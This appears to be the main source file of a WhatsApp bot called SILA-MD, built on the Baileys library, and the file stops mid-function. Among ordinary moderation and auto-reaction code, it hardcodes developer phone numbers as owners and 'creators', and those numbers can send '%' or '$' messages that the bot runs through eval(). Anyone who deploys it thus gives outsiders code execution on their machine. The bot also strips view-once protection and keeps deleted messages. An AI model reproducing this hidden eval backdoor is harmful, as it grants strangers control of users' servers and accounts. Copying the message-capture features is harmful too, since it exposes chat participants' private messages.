console.clear()
console.log("📳 Starting SILA-MD...")

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => {
  console.error("❌ Uncaught Exception:", err)
})
process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ Unhandled Rejection:", reason)
})

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const { handleAntiCall } = require('./plugins/settis2')
const prefix = config.PREFIX

// ============ OWNER CONFIGURATION ============
// Load owner numbers from config.js
const configOwnerNumbers = config.OWNER_NUMBER ? config.OWNER_NUMBER.split(',') : []
const ownerNumber = ['255768978061', '255789661031', ...configOwnerNumbers].map(num => num.trim())

// Create JIDs for owners
const ownerJids = ownerNumber.map(num => {
  if (num.includes('@s.whatsapp.net')) return num
  if (num.includes('-')) return num // For group JIDs
  return num + '@s.whatsapp.net'
})

console.log('👑 Owner Numbers:', ownerNumber)
console.log('👑 Owner JIDs:', ownerJids)

// ============ SECURITY FEATURES DATABASE ============
const securityDB = {
  antiMedia: {
    enabled: false,
    deleteSilently: true,
    mediaTypes: {
      image: true,
      video: true,
      audio: true,
      document: true,
      sticker: true,
      gif: true
    },
    allowedGroups: []
  },
  antiTag: {
    enabled: false,
    maxMentions: 5,
    action: 'warn',
    warnCount: 3
  },
  antiBug: {
    enabled: false,
    blockBugMessages: true,
    logBugs: true
  },
  antiSpam: {
    enabled: false,
    maxMessages: 5,
    timeWindow: 5000,
    action: 'warn',
    warnCount: 3,
    userMessages: new Map()
  },
  antiBan: {
    enabled: false,
    protectOwner: true,
    protectAdmins: true,
    protectBot: true,
    blockDeleteGroup: true,
    blockPromoteDemote: true
  }
}

// Load security settings if file exists
const securityFile = './security.json'
if (fs.existsSync(securityFile)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(securityFile))
    Object.assign(securityDB, loaded)
  } catch (e) {
    console.error('Error loading security settings:', e)
  }
}

// Save security settings
function saveSecurity() {
  fs.writeFileSync(securityFile, JSON.stringify(securityDB, null, 2))
}

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err
      })
    }
  })
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID || config.SESSION_ID.trim() === '') {
    console.log('❌ Please add your session to SESSION_ID in config.env or config.js')
    process.exit(1)
  }
  
  const sessdata = config.SESSION_ID.replace("sila~", '').trim()
  if (!sessdata) {
    console.log('❌ SESSION_ID is empty after processing')
    process.exit(1)
  }
  
  console.log('📥 Extracting session from base64 string...')
  
  try {
    // Decode base64 to compressed buffer
    const compressedBuffer = Buffer.from(sessdata, 'base64')
    
    // Decompress using zlib
    const zlib = require('zlib')
    const sessionBuffer = zlib.gunzipSync(compressedBuffer)
    
    // Write to creds.json
    fs.writeFileSync(__dirname + '/sessions/creds.json', sessionBuffer)
    
    console.log("✅ Session extracted and saved successfully")
    console.log(`📊 Session size: ${sessionBuffer.length} bytes`)
    
  } catch (err) {
    console.log('❌ Failed to extract session:', err.message)
    console.log('⚠️ Make sure you copied the FULL session string')
    process.exit(1)
  }
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn

// ============ SECURITY FUNCTIONS ============

// Anti-Media Function
async function handleAntiMedia(conn, mek, from, sender, isOwner, isAdmins) {
  if (!securityDB.antiMedia.enabled) return false
  if (isOwner || isAdmins) return false
  
  if (securityDB.antiMedia.allowedGroups.includes(from)) return false
  
  const type = getContentType(mek.message)
  if (!type) return false
  
  let mediaType = ''
  if (type.includes('image')) mediaType = 'image'
  else if (type.includes('video')) mediaType = 'video'
  else if (type.includes('audio')) mediaType = 'audio'
  else if (type.includes('document')) mediaType = 'document'
  else if (type.includes('sticker')) mediaType = 'sticker'
  else if (type.includes('gif')) mediaType = 'gif'
  else return false
  
  if (securityDB.antiMedia.mediaTypes[mediaType]) {
    if (securityDB.antiMedia.deleteSilently) {
      await conn.sendMessage(from, { delete: mek.key })
      console.log(`🔇 Silently deleted ${mediaType} from ${sender}`)
    } else {
      await conn.sendMessage(from, { delete: mek.key })
      await conn.sendMessage(from, { 
        text: `⚠️ *Anti-Media*\n\n${mediaType} imefutwa kwa sababu media haziruhusiwi kwenye group hili.`,
        contextInfo: { mentionedJid: [sender] }
      })
    }
    return true
  }
  return false
}

// Anti-Tag Function
async function handleAntiTag(conn, mek, from, sender, isOwner, isAdmins, groupMetadata) {
  if (!securityDB.antiTag.enabled) return false
  if (isOwner || isAdmins) return false
  
  const type = getContentType(mek.message)
  if (!type) return false
  
  let mentions = []
  if (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.mentionedJid) {
    mentions = mek.message.extendedTextMessage.contextInfo.mentionedJid
  }
  
  if (mentions.length > securityDB.antiTag.maxMentions) {
    const userWarns = antiTagWarns.get(sender) || 0
    const newWarns = userWarns + 1
    antiTagWarns.set(sender, newWarns)
    
    if (securityDB.antiTag.action === 'warn') {
      if (newWarns >= securityDB.antiTag.warnCount) {
        await conn.groupParticipantsUpdate(from, [sender], 'remove')
        antiTagWarns.delete(sender)
        await conn.sendMessage(from, { 
          text: `🚫 *Anti-Tag*\n\n@${sender.split('@')[0]} amefukuzwa kwa kutumia mentions nyingi.`,
          contextInfo: { mentionedJid: [sender] }
        })
      } else {
        await conn.sendMessage(from, { 
          text: `⚠️ *Anti-Tag Warning (${newWarns}/${securityDB.antiTag.warnCount})*\n\nUsitumie mentions nyingi (${mentions.length}). Max ni ${securityDB.antiTag.maxMentions}.`,
          contextInfo: { mentionedJid: [sender] }
        })
      }
    } else if (securityDB.antiTag.action === 'delete') {
      await conn.sendMessage(from, { delete: mek.key })
    } else if (securityDB.antiTag.action === 'kick') {
      await conn.groupParticipantsUpdate(from, [sender], 'remove')
    }
    return true
  }
  return false
}

// Anti-Bug Function
async function handleAntiBug(conn, mek, from, sender) {
  if (!securityDB.antiBug.enabled) return false
  
  const type = getContentType(mek.message)
  if (!type) return false
  
  let text = ''
  if (type === 'conversation') text = mek.message.conversation
  else if (type === 'extendedTextMessage') text = mek.message.extendedTextMessage.text
  else return false
  
  const bugPatterns = [
    /[\u0000-\u001F\u007F-\u009F]/,
    /\u202E/,
    /.{1000,}/,
    /<[^>]*script/i,
    /[\uD800-\uDFFF]{2,}/
  ]
  
  for (const pattern of bugPatterns) {
    if (pattern.test(text)) {
      if (securityDB.antiBug.blockBugMessages) {
        await conn.sendMessage(from, { delete: mek.key })
        if (securityDB.antiBug.logBugs) {
          console.log(`🐛 Bug message blocked from ${sender}: ${text.slice(0, 100)}`)
        }
      }
      return true
    }
  }
  return false
}

// Anti-Spam Function
const userMessages = new Map()
const antiTagWarns = new Map()

async function handleAntiSpam(conn, mek, from, sender, isOwner, isAdmins) {
  if (!securityDB.antiSpam.enabled) return false
  if (isOwner || isAdmins) return false
  
  const now = Date.now()
  const userData = securityDB.antiSpam.userMessages.get(sender) || { count: 0, firstMsg: now }
  
  if (now - userData.firstMsg < securityDB.antiSpam.timeWindow) {
    userData.count++
    securityDB.antiSpam.userMessages.set(sender, userData)
    
    if (userData.count > securityDB.antiSpam.maxMessages) {
      const userWarns = antiTagWarns.get(sender) || 0
      const newWarns = userWarns + 1
      antiTagWarns.set(sender, newWarns)
      
      if (securityDB.antiSpam.action === 'warn') {
        if (newWarns >= securityDB.antiSpam.warnCount) {
          await conn.groupParticipantsUpdate(from, [sender], 'remove')
          antiTagWarns.delete(sender)
          securityDB.antiSpam.userMessages.delete(sender)
        } else {
          await conn.sendMessage(from, { 
            text: `⚠️ *Anti-Spam Warning (${newWarns}/${securityDB.antiSpam.warnCount})*\n\nTafadhali usitumie spam.`,
            contextInfo: { mentionedJid: [sender] }
          })
        }
      } else if (securityDB.antiSpam.action === 'mute') {
        await conn.groupParticipantsUpdate(from, [sender], 'mute')
      } else if (securityDB.antiSpam.action === 'kick') {
        await conn.groupParticipantsUpdate(from, [sender], 'remove')
      }
      
      await conn.sendMessage(from, { delete: mek.key })
      return true
    }
  } else {
    securityDB.antiSpam.userMessages.set(sender, { count: 1, firstMsg: now })
  }
  return false
}

// Anti-Ban Function
async function handleAntiBan(conn, update, groupId, participant, action, executor) {
  if (!securityDB.antiBan.enabled) return false
  
  const botJid = conn.user.id
  const isExecutorOwner = ownerJids.includes(executor)
  
  if (participant === botJid && action === 'remove') {
    if (!isExecutorOwner) {
      await conn.groupParticipantsUpdate(groupId, [executor], 'remove')
      await conn.sendMessage(groupId, { 
        text: `🛡️ *Anti-Ban*\n\nMtu aliyejaribu kumfukuza bot amefukuzwa.`
      })
      return true
    }
  }
  
  if (securityDB.antiBan.protectOwner && ownerJids.includes(participant)) {
    if (action === 'remove' || action === 'demote') {
      if (!isExecutorOwner) {
        await conn.groupParticipantsUpdate(groupId, [executor], 'remove')
        await conn.sendMessage(groupId, { 
          text: `🛡️ *Anti-Ban*\n\nMtu aliyejaribu kumfukuza Owner amefukuzwa.`
        })
        return true
      }
    }
  }
  
  if (securityDB.antiBan.blockDeleteGroup && action === 'delete') {
    if (!isExecutorOwner) {
      await conn.sendMessage(groupId, { 
        text: `🛡️ *Anti-Ban*\n\nKufuta group hairuhusiwi.`
      })
      return true
    }
  }
  
  return false
}

//=============================================

async function connectToWA() {
  try {
    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        console.log('[ ⚠️ ] Connection closed:', lastDisconnect?.error?.output?.statusCode)
        
        if (shouldReconnect) {
          console.log('[ ♻️ ] Attempting to reconnect...')
          setTimeout(() => connectToWA(), 5000)
        } else {
          console.log('[ ❌ ] Logged out. Please update your SESSION_ID')
        }
      } else if (connection === 'open') {
        try {
          console.log('[ ❤️ ] Installing Plugins')

          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              require("./plugins/" + plugin)
            }
          })

          console.log('[ ✔ ] Plugins installed successfully ✅')
          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')

          let up = `┏━❑ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐈𝐋𝐀-𝐌𝐃 ━━━━━━━━━━━
┃ 🔹 Your bot is now active & ready!
┃ 🔹 Enjoy smart, seamless chats
┃ 🔹 Current prefix: .
┗━━━━━━━━━━━━━━━━━
┏━❑ SUPPORT PROJECT ━━━━━━━━━
┃ ⭐ Star | 🔄 Fork | 📢 Share
┃ 🔗 GitHub: https://github.com/Sila-Md/SILA-MD
┗━━━━━━━━━━━━━━━━━━━━━━━━

> © 𝐒𝐈𝐋𝐀 𝐌𝐃 | Crafted with precision`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/36vahk.png` }, caption: up })

          const channelJid = "120363402325089913@newsletter"
          try {
            await conn.newsletterFollow(channelJid)
            console.log(`Successfully followed channel: ${channelJid}`)
          } catch (error) {
            console.error(`Failed to follow channel: ${error}`)
          }

        } catch (error) {
          console.error("[ ❌ ] Error during post-connect setup:", error)
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

  } catch (err) {
    console.error("[ ❌ ] Connection failed:", err)
  }
  
  // Auto Bio Update
  function getCurrentDateTimeParts() {
    const options = {
      timeZone: 'Africa/Nairobi',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    };
    const formatter = new Intl.DateTimeFormat('en-KE', options);
    const parts = formatter.formatToParts(new Date());

    let date = '', time = '';

    parts.forEach(part => {
      if (part.type === 'day' || part.type === 'month' || part.type === 'year') {
        date += part.value;
        if (part.type !== 'year') date += '/';
      }
      if (part.type === 'hour' || part.type === 'minute' || part.type === 'second') {
        time += part.value;
        if (part.type !== 'second') time += ':';
      }
    });

    return { date, time };
  }

  setInterval(async () => {
    if (config.AUTO_BIO === "true") {
      const { date, time } = getCurrentDateTimeParts();
      const bioText = `𝚈𝚘𝚞𝚛 𝚋𝚘𝚝 𝚒𝚜 𝚗𝚘𝚠 𝚊𝚌𝚝𝚒𝚟𝚎 & 𝚛𝚎𝚊𝚍𝚢`;
      try {
        await conn.setStatus(bioText);
        console.log(`Updated Bio: ${bioText}`);
      } catch (err) {
        console.error("Failed to update Bio:", err);
      }
    }
  }, 60000);

  //==============================
  conn?.ev?.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2))
        await AntiDelete(conn, updates)
      }
    }
  });
  //============================== 

  conn.ev.on("group-participants.update", async (update) => {
    if (securityDB.antiBan.enabled) {
      const { id, participants, action, author } = update
      for (const participant of participants) {
        await handleAntiBan(conn, update, id, participant, action, author)
      }
    }
    GroupEvents(conn, update)
  });	  
	  
  //=============MESSAGE HANDLER===============
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    
    // ============ FIXED: STATUS MESSAGES HANDLING ============
    // Handle status messages FIRST before any processing
    if (mek.key && mek.key.remoteJid === 'status@broadcast') {
      
      // Auto View Status
      if (config.AUTO_STATUS_SEEN === "true") {
        try {
          await conn.readMessages([mek.key])
          console.log(`👁️ Auto-viewed status from: ${mek.key.participant || 'unknown'}`)
        } catch (err) {
          console.error("❌ Auto-view status error:", err)
        }
      }
      
      // Auto React Status
      if (config.AUTO_STATUS_REACT === "true") {
        try {
          const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
          await conn.sendMessage(mek.key.remoteJid, {
            react: {
              text: randomEmoji,
              key: mek.key,
            }
          })
          console.log(`✅ Auto-reacted to status with: ${randomEmoji}`)
        } catch (err) {
          console.error("❌ Auto-react status error:", err)
        }
      }
      
      // Auto Reply Status
      if (config.AUTO_STATUS_REPLY === "true") {
        try {
          const user = mek.key.participant
          const text = `${config.AUTO_STATUS_MSG || 'Nice status! 💜'}`
          await conn.sendMessage(user, { text: text }, { quoted: mek })
          console.log(`✅ Auto-replied to status from: ${user}`)
        } catch (err) {
          console.error("❌ Auto-reply status error:", err)
        }
      }
      
      // Don't process status messages further
      return
    }
    
    // ============ NORMAL MESSAGE PROCESSING ============
    // Handle view once messages
    if (mek.message?.viewOnceMessageV2) {
      mek.message = mek.message.viewOnceMessageV2.message
    }
    
    // Handle ephemeral messages
    if (getContentType(mek.message) === 'ephemeralMessage') {
      mek.message = mek.message.ephemeralMessage.message
    }
    
    if (config.READ_MESSAGE === 'true') {
      await conn.readMessages([mek.key]);
      console.log(`Marked message from ${mek.key.remoteJid} as read.`);
    }
        
    await Promise.all([
      saveMessage(mek),
    ]);
    
    const m = sms(conn, mek)
    const type = getContentType(mek.message)
    const content = JSON.stringify(mek.message)
    const from = mek.key.remoteJid
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
    const isCmd = body.startsWith(prefix)
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const text = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const botNumber = conn.user.id.split(':')[0]
    const pushname = mek.pushName || 'Gon'
    const isMe = botNumber.includes(senderNumber)
    
    // ============ FIXED OWNER DETECTION ============
    // Check if sender is owner (works everywhere - inbox, group, private)
    const isOwner = ownerJids.includes(sender) || isMe || ownerNumber.includes(senderNumber)
    
    // Get bot's JID
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    
    // Get group metadata if in group
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null
    const groupName = isGroup && groupMetadata ? groupMetadata.subject : ''
    const participants = isGroup && groupMetadata ? groupMetadata.participants : ''
    
    // ============ FIXED ADMIN DETECTION ============
    // Get group admins properly
    let groupAdmins = []
    if (isGroup && groupMetadata && groupMetadata.participants) {
      groupAdmins = groupMetadata.participants
        .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
        .map(p => p.id)
    }
    
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    
    const isReact = m.message.reactionMessage ? true : false
    
    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek })
    }
    
    const udp = botNumber.split('@')[0];
    const rav = ['255789661031', '255650034217'];
    let isCreator = [udp, ...rav, config.DEV]
      .map(v => v && v.replace ? v.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)
      .filter(v => v)
      .includes(sender);

    // ============ RUN SECURITY CHECKS ============
    if (isGroup) {
      if (await handleAntiMedia(conn, mek, from, sender, isOwner, isAdmins)) return
      if (await handleAntiTag(conn, mek, from, sender, isOwner, isAdmins, groupMetadata)) return
      if (await handleAntiSpam(conn, mek, from, sender, isOwner, isAdmins)) return
    }
    
    if (await handleAntiBug(conn, mek, from, sender)) return

    // ============ OWNER COMMANDS (WORK EVERYWHERE) ============
    if (isCreator && mek.text.startsWith('%')) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
      }
      try {
        let resultTest = eval(code);
        if (typeof resultTest === 'object')
          reply(util.format(resultTest));
        else reply(util.format(resultTest));
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }
    
    if (isCreator && mek.text.startsWith('$')) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
      }
      try {
        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
        let h = util.format(resultTest);
        if (h === undefined) return console.log(h);
        else reply(h);
      } catch (err) {
        if (err === undefined)
          return console.log('error');
        else reply(util.format(err));
      }
      return;
    }
    
    //================ownerreact==============
    if (ownerNumber.includes(senderNumber) && !isReact) {
      const reactions = ["💀", "👨‍💻"];
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    //==========public react============//
    
    if (!isReact && config.AUTO_REACT === 'true') {
      const reactions = [
        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
      ];

      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }
          
    if (!isReact && config.CUSTOM_REACT === 'true') {
      const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',');
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }
        
    //==========WORKTYPE============ 
    // FIXED: Owner can use commands everywhere regardless of MODE
    if (!isOwner) {
      if (config.MODE === "private") return
      if (isGroup && config.MODE === "inbox") return
      if (!isGroup && config.MODE === "groups") return
    }
   
    // take commands 
                 
    const events = require('./command')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
        
        try {
          cmd.function(conn, mek, m, {
            from, quoted, body, isCmd, command, args, q, text, 
            isGroup, sender, senderNumber, botNumber2, botNumber, 
            pushname, isMe, isOwner, isCreator, groupMetadata, 
            groupName, participants, groupAdmins, isBotAdmins, isAdmins, 
            reply, securityDB, saveSecurity
          });
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }
    
    events.commands.map(async(command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, {
          from, l, quoted, body, isCmd, command, args, q, text, 
          isGroup, sender, senderNumber, botNumber2, botNumber, 
          pushname, isMe, isOwner, isCreator, groupMetadata, 
          groupName, participants, groupAdmins, isBotAdmins, isAdmins, 
          reply, securityDB, saveSecurity
        })
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, {
          from, l, quoted, body, isCmd, command, args, q, text, 
          isGroup, sender, senderNumber, botNumber2, botNumber, 
          pushname, isMe, isOwner, isCreator, groupMetadata, 
          groupName, participants, groupAdmins, isBotAdmins, isAdmins, 
          reply, securityDB, saveSecurity
        })
      } else if (
        (command.on === "image" || command.on === "photo") &&
        mek.type === "imageMessage"
      ) {
        command.function(conn, mek, m, {
          from, l, quoted, body, isCmd, command, args, q, text, 
          isGroup, sender, senderNumber, botNumber2, botNumber, 
          pushname, isMe, isOwner, isCreator, groupMetadata, 
          groupName, participants, groupAdmins, isBotAdmins, isAdmins, 
          reply, securityDB, saveSecurity
        })
      } else if (
        command.on === "sticker" &&
        mek.type === "stickerMessage"
      ) {
        command.function(conn, mek, m, {
          from, l, quoted, body, isCmd, command, args, q, text, 
          isGroup, sender, senderNumber, botNumber2, botNumber, 
          pushname, isMe, isOwner, isCreator, groupMetadata, 
          groupName, participants, groupAdmins, isBotAdmins, isAdmins, 
          reply, securityDB, saveSecurity
        })
      }
    });
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      return buffer
    }
    
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      let res = await axios.head(url)
      mime = res.headers['content-type']
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
      }
      let type = mime.split("/")[0] + "Message"
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
      }
    }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
